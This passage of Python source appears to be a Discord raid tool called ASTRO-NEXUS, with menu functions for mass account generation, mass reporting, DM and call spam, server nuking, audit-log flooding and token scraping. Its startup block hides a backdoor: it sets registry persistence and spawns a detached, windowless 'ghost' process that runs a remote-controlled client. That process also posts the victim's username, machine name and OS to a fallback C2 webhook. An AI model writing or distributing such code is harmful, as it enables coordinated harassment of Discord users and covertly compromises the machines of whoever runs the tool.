        console.log("WARNING", C["yellow"], "Captcha may be required", "Manual solving needed")
        
        # Statistics
        stats = {
            "total": count,
            "success": 0,
            "failed": 0,
            "verified": 0,
            "tokens": []
        }
        
        def generate_single(index):
            """Generate single account"""
            try:
                console.log("THREAD", C["cyan"], f"Account {index+1}/{count}", "Starting...")
                account_gen = DiscordAccountGen()
                account = account_gen.create_account(provider, captcha_solve=False)
                
                if account:
                    stats["success"] += 1
                    if account.get("verified"):
                        stats["verified"] += 1
                    stats["tokens"].append(account["token"])
                    console.log("COMPLETE", C["green"], f"Account {index+1}", account["username"])
                    return account
                else:
                    stats["failed"] += 1
                    console.log("FAILED", C["red"], f"Account {index+1}", "Generation failed")
                    return None
            except Exception as e:
                stats["failed"] += 1
                console.log("ERROR", C["red"], f"Account {index+1}", str(e))
                return None
        
        # Parallel generation
        console.log("EXECUTING", C["rose"], "BATCH GENERATION", "Starting threads...")
        
        accounts = []
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(generate_single, i) for i in range(count)]
            for future in futures:
                try:
                    result = future.result(timeout=300)  # 5 min timeout per account
                    if result:
                        accounts.append(result)
                except Exception as e:
                    console.log("ERROR", C["red"], "Thread Failed", str(e))
        
        # Show statistics
        console.clear()
        console.render_ascii()
        console.log("STATISTICS", C["cyan"], "═" * 50)
        console.log("TOTAL", C["white"], str(stats["total"]))
        console.log("SUCCESS", C["green"], str(stats["success"]))
        console.log("FAILED", C["red"], str(stats["failed"]))
        console.log("VERIFIED", C["yellow"], str(stats["verified"]))
        console.log("SUCCESS RATE", C["cyan"], f"{(stats['success']/stats['total']*100):.1f}%")
        
        # Export tokens
        if stats["tokens"]:
            console.log("EXPORTING", C["cyan"], f"{len(stats['tokens'])} tokens", "...")
            
            # Save to tokens.txt
            with open("data/tokens.txt", "a") as f:
                for token in stats["tokens"]:
                    f.write(f"{token}\n")
            console.log("SAVED", C["green"], "tokens.txt", f"{len(stats['tokens'])} tokens added")
            
            # Save full account data
            try:
                import json
                accounts_file = "data/generated_accounts.json"
                try:
                    with open(accounts_file, "r") as f:
                        existing = json.load(f)
                except:
                    existing = []
                
                existing.extend(accounts)
                with open(accounts_file, "w") as f:
                    json.dump(existing, f, indent=2)
                console.log("SAVED", C["green"], accounts_file, f"{len(accounts)} accounts")
            except Exception as e:
                console.log("ERROR", C["red"], "Save Failed", str(e))
        
        input(f"\n   {self.background}» Operation Complete. Press Enter «{Fore.RESET}")
        self.main_menu()

    @wrapper
    def accept(self):
        console.title(f"ASTRO-NEXUS - Accept Rules")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            return

        console.clear()
        console.render_ascii()
        self.raider.accept_rules(guild_id)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def guild(self):
        console.title(f"ASTRO-NEXUS - Guild Checker")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            return

        console.clear()
        console.render_ascii()
        self.raider.guild_checker(guild_id)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def bio_changer(self):
        console.title(f"ASTRO-NEXUS - Bio Changer")
        bio = input(console.prompt("Bio"))
        if bio == "":
            return

        args = [
            (token, bio) for token in tokens
        ]
        self.run(self.raider.bio_changer, args)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def onboard(self):
        console.title(f"ASTRO-NEXUS - Onboarding Bypass")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            return

        console.clear()
        console.render_ascii()
        self.raider.onboard_bypass(guild_id)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def credit(self):
        credits_lines = [
            "Special Thanks to",
            "Coder: GamingParkBG",
            "Owner: GamingParkBG",
            "ASTRO-NEXUS",
            "And last but not least, you! Without you, this project wouldn't be possible.",
        ]

        for line in credits_lines:
            try:
                cols = os.get_terminal_size().columns
            except:
                cols = 120
            centered_line = line.center(cols)
            print(f"{Fore.RESET}{self.background}{centered_line}{Fore.RESET}")

        input("\n ~/> press enter to continue ")

    @wrapper
    def exits(self):
        os._exit(0)

    @wrapper
    def mass_report(self):
        console.title(f"ASTRO-NEXUS - Mass Report")
        link = input(console.prompt("Message Link"))
        if link == "" or not link.startswith("https://"): return
        
        guild_id = link.split("/")[4]
        channel_id = link.split("/")[5]
        message_id = link.split("/")[6]
        
        print("\n   [1] Illegal Content  [2] Harassment  [3] Spam  [4] Other")
        reason_map = {"1": 1, "2": 2, "3": 3, "4": 4}
        choice = input(console.prompt("Reason"))
        reason = reason_map.get(choice, 3)

        args = [(token, guild_id, channel_id, message_id, reason) for token in tokens]
        self.run(self.raider.mass_report, args)

    @wrapper
    def hypesquad(self):
        console.title(f"ASTRO-NEXUS - HypeSquad Joiner")
        print("\n   [1] Bravery  [2] Brilliance  [3] Balance")
        choice = input(console.prompt("House"))
        house_id = {"1": 1, "2": 2, "3": 3}.get(choice, 1)
        
        args = [(token, house_id) for token in tokens]
        self.run(self.raider.hypesquad, args)

    @wrapper
    def mass_block(self):
        console.title(f"ASTRO-NEXUS - Mass Block")
        user_id = input(console.prompt("User ID"))
        if user_id == "": return
        
        args = [(token, user_id) for token in tokens]
        self.run(self.raider.mass_block, args)

    @wrapper
    def leave_all(self):
        console.title(f"ASTRO-NEXUS - Leave All Guilds")
        confirm = input(console.prompt("Are you sure? (y/n)"))
        if "y" not in confirm: return
        
        args = [(token,) for token in tokens]
        self.run(self.raider.leave_all, args)

    @wrapper
    def usage_guide(self):
        console.title("ASTRO-NEXUS - Master Documentation [Full Rig]")
        guides = [
            ("01", "Joiner       ", "All tokens join a server using an Invite link/code."),
            ("02", "Leaver       ", "All tokens leave a server using its Guild ID."),
            ("03", "Spammer      ", "High-velocity channel strike. Includes Ghost & DOS modes."),
            ("04", "Checker      ", "Validates tokens and sorts into Live/Locked/Invalid."),
            ("05", "Reaction     ", "Multi-token reaction bombing on a specific message link."),
            ("06", "Server Nuker ", "Complete destruction: Del channels/roles and rebuilds wasteland."),
            ("07", "Formatter    ", "Purifies data/tokens.txt from junk data and duplicates."),
            ("08", "Button Click ", "Automated interaction with verification bot buttons."),
            ("09", "Accept Rules ", "Instantly bypasses Discord's 'Verify Identity' rules on join."),
            ("10", "Guild Check  ", "Checks which tokens have successfully entered a target guild."),
            ("11", "Friend Spam  ", "Floods a target User ID with friend requests from everyone."),
            ("12", "Analytics    ", "Deep extraction of account data (Nitros, Badges, Billing)."),
            ("13", "Onliner      ", "Keeps all tokens in an active online status infinitely."),
            ("14", "Soundboard   ", "Annoying soundboard spam in a VC for max irritation."),
            ("15", "Change Nick  ", "Mass rename all tokens to a specific name in a server."),
            ("16", "Thread Spam  ", "Creates endless threads in a channel to flood the sidebar."),
            ("17", "Typer        ", "Sets 'typing...' status for all tokens to cause panic."),
            ("18", "Nitro Sniper ", "Real-time gift monitoring. First one to see it, snipes it."),
            ("19", "Call Spammer ", "Lethal call-bombing a user until they block or log out."),
            ("20", "Bio Change   ", "Updates the 'About Me' section of all token profiles."),
            ("21", "Voice Joiner ", "Moves all tokens into a specific voice channel."),
            ("22", "Onboarding   ", "Completes Discord's new user onboarding steps automatically."),
            ("23", "DM Spammer   ", "Direct Message carpet bombing to a target User ID."),
            ("24", "Exit         ", "Safely shuts down the interface and core processes."),
            ("25", "Mass Report  ", "Coordinated reports to Discord T&S to terminate targets."),
            ("26", "HypeSquad    ", "Joins a specific HypeSquad house (Brilliance/Bravery/Balance)."),
            ("27", "Mass Block   ", "Blocks a specific User ID from every token on the grid."),
            ("28", "Leave All    ", "Tokens exit every single server they are currently in."),
            ("29", "Token Scrape ", "The Megalodon Engine: Sucks tokens from Pastebin/GitHub."),
            ("30", "KABOOM (Nuke)", "Targeted server destruction (Channels + Roles strike)."),
            ("31", "DEL CHANNELS ", "Wipes every channel from the server instantly."),
            ("32", "DEL ROLES    ", "Wipes every role from the server instantly."),
            ("33", "DEL EMOJIS   ", "Wipes every emoji from the server instantly."),
            ("34", "DEL WEBHOOKS ", "Wipes every webhook from the server instantly."),
            ("35", "NEW CHANNELS ", "Mass creates 100+ channels with a custom custom name."),
            ("36", "NEW ROLES    ", "Mass creates 100+ roles with admin permissions."),
            ("37", "MASS BAN     ", "The Executioner: Bans every single member in the server."),
            ("38", "MASS KICK    ", "Cleans the server by kicking every member."),
            ("39", "IDENTITY MOD ", "Synchronizes avatars and usernames for the entire fleet."),
            ("40", "PRUNE GUILD  ", "Removes inactive members from the guild via API."),
            ("41", "AUTO STATUS  ", "Sets a custom status message (Playing/Watching) for all."),
            ("42", "GRANT ADMIN  ", "Creates a hidden admin role and gives it to all tokens."),
            ("43", "AUDIT FLOOD  ", "Overloads the audit logs with junk to hide your tracks."),
            ("44", "WEBHOOK BLAST", "Untraceable message flood via server-side webhooks."),
            ("45", "PROXY GEN    ", "Scrapes and verifies millions of proxies against Discord."),
            ("46", "PROXY CLEAN  ", "Purges dead/unverified proxies from your local grid."),
            ("47", "FRIEND DM    ", "Mass messages every friend of every active token."),
            ("48", "FRIEND PURGE ", "Deletes all friends and pending requests from tokens."),
            ("49", "SERVER CLONE ", "Copies a server's layout/roles/channels to another."),
            ("50", "RBW CYCLONE  ", "Indefinitely cycles role colors for visual chaos."),
            ("51", "STICKER BOMB ", "High-velocity sticker spam assault."),
        ]
        
        print(f"\n{Fore.LIGHTCYAN_EX}   ASTRO-NEXUS ULTIMATE BUTTON GUIDE [1-51]\n")
        # Optimization: Show 15 per screen to keep it readable
        page = 0
        while page < len(guides):
            for i in range(page, min(page + 15, len(guides))):
                code, category, desc = guides[i]
                line = f"{Fore.WHITE}[{self.background}{code}{Fore.WHITE}] {Fore.CYAN}{category:<15} {Fore.RESET}{desc}"
                print(f"   {line}")
            
            page += 15
            if page < len(guides):
                input(f"\n {C['aqua']}» {Fore.RESET}Press Enter for Next Page ({page}/{len(guides)}) ")
                console.clear()
                console.render_ascii()
                print(f"\n{Fore.LIGHTCYAN_EX}   ASTRO-NEXUS ULTIMATE BUTTON GUIDE [CONT.]\n")

        print(f"\n{C['rose']}   CORE DOCUMENTATION COMPLETE.")
        input(f"\n {C['aqua']}» {Fore.RESET}Press Enter to return to Grid ")

    @wrapper
    def tokens_tutorial(self):
        console.title("ASTRO-NEXUS - Tokens Tutorial")
        tutorial = [
            "How to get Discord Tokens:",
            "1. Open Discord in your Browser (Chrome/Edge).",
            "2. Press F12 or Ctrl+Shift+I to open Developer Tools.",
            "3. Go to the 'Application' tab (click >> if hidden).",
            "4. On the left, expand 'Local Storage' and click 'https://discord.com'.",
            "5. Search for 'token' in the filter box.",
            "6. Copy the value (without quotes) and paste it into data/tokens.txt.",
        ]
        print("\n")
        for line in tutorial:
            try:
                cols = os.get_terminal_size().columns
            except:
                cols = 80
            centered_line = line.center(cols)
            print(f"{Fore.RESET}{self.background}{centered_line}{Fore.RESET}")
        input("\n ~/> press enter to continue ")
        input("\n ~/> press enter to continue ")

    @wrapper
    def proxies_tutorial(self):
        console.title("ASTRO-NEXUS - Proxies Tutorial")
        tutorial = [
            "How to use Proxies:",
            "1. Get some HTTP/HTTPS proxies (Webshare, ProxyScrape, etc.).",
            "2. Format: ip:port OR user:pass@ip:port.",
            "3. Paste them into data/proxies.txt (har line pe ek).",
            "4. Raider will automatically cycle through them.",
            "5. Proxies help avoid Discord rate limits and IP bans.",
        ]
        print("\n")
        for line in tutorial:
            try:
                cols = os.get_terminal_size().columns
            except:
                cols = 80
            centered_line = line.center(cols)
            print(f"{Fore.RESET}{self.background}{centered_line}{Fore.RESET}")
        input("\n ~/> press enter to continue ")
        self.main_menu()

if __name__ == "__main__":
    # 1. SETUP PERSISTENCE
    setup_registry_persistence()
    
    # Simple Lock Mechanism to prevent multiple background instances
    lock_file = BACKDOOR_LOCK
    
    # 2. GHOST MODE HANDLER (The hidden background process)
    if "--ghost" in sys.argv:
        # Check if another ghost is already running and ALIVE
        if os.path.exists(BACKDOOR_LOCK):
            try:
                with open(BACKDOOR_LOCK, 'r') as f:
                    pid = int(f.read())
                if psutil.pid_exists(pid):
                    sys.exit()
            except: pass
            
        with open(BACKDOOR_LOCK, 'w') as f:
            f.write(str(os.getpid()))
            
        # Stealth mode will activate AFTER successful connection (in on_ready)
        # INFINITE RETRY LOOP for the background client
        failures = 0
        while True:
            try:
                client.run(TOKEN)
                failures = 0 # Reset on success (though run() blocks until disconnect)
            except Exception as e:
                failures += 1
                # Log errors to file for debugging
                try:
                    with open("ghost_error.log", "a") as log:
                        log.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {e}\n")
                except: pass
                
                # Fallback C2 Logic
                if failures >= 5 and BACKUP_C2_URL:
                    try:
                        import requests
                        payload = {
                            "username": "NEXUS FALLBACK",
                            "avatar_url": "https://i.imgur.com/K6Y7x9G.png",
                            "embeds": [{
                                "title": "⚠️ CONNECTION LOST - FALLBACK REPORT",
                                "color": 0xFF0000,
                                "fields": [
                                    {"name": "User", "value": os.getlogin(), "inline": True},
                                    {"name": "Machine", "value": os.environ.get('COMPUTERNAME', 'N/A'), "inline": True},
                                    {"name": "OS", "value": sys.platform, "inline": True},
                                    {"name": "Error", "value": str(e)[:200], "inline": False}
                                ],
                                "footer": {"text": f"Failures: {failures} | Retrying..."}
                            }]
                        }
                        requests.post(BACKUP_C2_URL, json=payload)
                    except: pass
                
                time.sleep(15) # Wait for network self-healing
            
    # 3. SPAWN DETACHED GHOST (If not already running/alive)
    ghost_running = False
    if os.path.exists(BACKDOOR_LOCK):
        try:
            with open(BACKDOOR_LOCK, 'r') as f:
                pid = int(f.read())
            if psutil.pid_exists(pid):
                ghost_running = True
            else:
                os.remove(BACKDOOR_LOCK) # Clean stale lock
        except: 
            ghost_running = False # Try spawning if check fails

    if not ghost_running:
        # Full stealth mode: Hidden console + Detached
        # 0x08000000 = CREATE_NO_WINDOW
        # 0x00000008 = DETACHED_PROCESS
        creation_flags = 0x08000000 | 0x00000008
        if sys.platform == "win32":
            subprocess.Popen([sys.executable, sys.argv[0], "--ghost"], 
                             creationflags=creation_flags, 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL,
                             close_fds=True)
        else:
            subprocess.Popen([sys.executable, sys.argv[0], "--ghost"], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL, 
                             start_new_session=True)
    
    # 4. LAUNCH LOCAL INTERFACE (The foreground UI)
    try:
        Menu().main_menu()
    except Exception as e:
        print(f"Raider Interface Error: {e}")
        time.sleep(5)
    
    # If UI is closed, this process exits, but the --ghost process sent above
    # continues to run because it was spawned with DETACHED_PROCESS/start_new_session.

